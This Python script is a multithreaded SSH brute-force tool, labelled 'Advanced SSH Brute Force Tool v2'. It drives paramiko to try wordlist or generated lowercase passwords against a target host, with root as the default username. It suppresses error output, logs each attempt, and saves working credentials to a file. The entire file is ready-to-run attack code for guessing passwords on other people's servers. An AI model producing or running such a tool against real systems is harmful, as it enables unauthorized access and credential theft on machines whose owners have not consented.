import paramiko
import socket
import threading
import queue
import itertools
import string
import argparse
from colorama import Fore, init
import contextlib
import sys
import os
import time
import logging
from datetime import datetime

# Setup logger
log_filename = f"brute_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
logging.basicConfig(
    filename=log_filename,
    filemode='w',
    format='%(asctime)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

init(autoreset=True)

@contextlib.contextmanager
def suppress_stderr():
    with open(os.devnull, "w") as devnull:
        old_stderr = sys.stderr
        sys.stderr = devnull
        try:
            yield
        finally:
            sys.stderr = old_stderr

attempt_counter = 0
failed_log = []
max_user_retries = {}
found_users = set()  # Track users with found credentials

def is_ssh_open(host, user, password, retry=2, delay=0.5, max_retries=3):
    global attempt_counter
    with suppress_stderr():
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        while retry >= 0:
            try:
                client.connect(hostname=host, username=user, password=password, timeout=3)
                print(f"{Fore.GREEN}[+] Found: {user}@{host}:{password}")
                logging.info(f"SUCCESS: {user}@{host}:{password}")
                client.close()
                return True
            except paramiko.AuthenticationException:
                print(f"{Fore.RED}[-] Invalid: {user}:{password}")
                logging.warning(f"Invalid: {user}:{password}")
                max_user_retries[user] = max_user_retries.get(user, 0) + 1
                break
            except (paramiko.SSHException, socket.timeout):
                print(f"{Fore.YELLOW}[!] SSH Retry ({2 - retry + 1}) for {user}:{password}")
                logging.warning(f"Retry {2 - retry + 1}: {user}:{password}")
                retry -= 1
                time.sleep(delay)
            except Exception as e:
                print(f"{Fore.MAGENTA}[!] Error: {e}")
                logging.error(f"Exception for {user}:{password} - {e}")
                break
        client.close()
        attempt_counter += 1
        return False

def worker():
    while not q.empty():
        user, password = q.get()
        # Skip if user already found
        with lock:
            if user in found_users:
                q.task_done()
                continue
        if max_user_retries.get(user, 0) >= args.max_user_retries:
            print(f"{Fore.BLUE}[!] Skipping {user} (max retry limit reached)")
            logging.info(f"Skipping {user} after {args.max_user_retries} failed attempts.")
            q.task_done()
            return

        result = is_ssh_open(args.host, user, password, retry=args.retry, delay=args.delay, max_retries=args.max_user_retries)

        # Always log failed (including unhandled retry errors)
        if not result:
            with lock:
                failed_log.append(f"{user}:{password}")

        # If success, write to output and mark user as found
        if result:
            with lock:
                found_users.add(user)
                with open(args.output, "a") as f:
                    f.write(f"{user}@{args.host}:{password}\n")

        q.task_done()

def generate_passwords(chars, length):
    for pwd in itertools.product(chars, repeat=length):
        yield ''.join(pwd)

def load_lines(filepath):
    try:
        with open(filepath, "r") as f:
            return f.read().splitlines()
    except FileNotFoundError:
        print(f"{Fore.RED}[!] File not found: {filepath}")
        return []

# Argument parser
parser = argparse.ArgumentParser(description="Advanced SSH Brute Force Tool v2")
parser.add_argument("host", help="Target host IP")
parser.add_argument("-U", "--userlist", help="File with usernames")
parser.add_argument("-P", "--passlist", help="File with passwords")
parser.add_argument("--generate", action="store_true", help="Use password generator instead of file")
parser.add_argument("--length", type=int, default=2, help="Password length for generator")
parser.add_argument("--threads", type=int, default=2, help="Number of worker threads")
parser.add_argument("--retry", type=int, default=1, help="Retries per SSH error")
parser.add_argument("--delay", type=float, default=0.5, help="Delay between retries (in seconds)")
parser.add_argument("--max-user-retries", type=int, default=3, help="Max invalid attempts per user")
parser.add_argument("--output", default="credentials.txt", help="Output file for valid credentials")
args = parser.parse_args()

# Setup
q = queue.Queue()
lock = threading.Lock()
users = load_lines(args.userlist) if args.userlist else ["root"]
passwords = generate_passwords(string.ascii_lowercase, args.length) if args.generate else load_lines(args.passlist)

# Load combinations
for user in users:
    for password in passwords:
        q.put((user, password))

start_time = time.time()

# Launch threads
threads = []
for _ in range(args.threads):
    t = threading.Thread(target=worker, daemon=True)
    t.start()
    threads.append(t)

q.join()

# Save failed attempts
if failed_log:
    with open("failed_attempts.txt", "w") as f:
        for entry in failed_log:
            f.write(entry + "\n")

# Final report
elapsed = time.time() - start_time
print(f"{Fore.CYAN}\n[+] Brute force complete.")
print(f"{Fore.CYAN}[+] Total attempts: {attempt_counter}")
print(f"{Fore.CYAN}[+] Time taken: {elapsed:.2f} seconds")
print(f"{Fore.CYAN}[+] Output saved to: {args.output}")
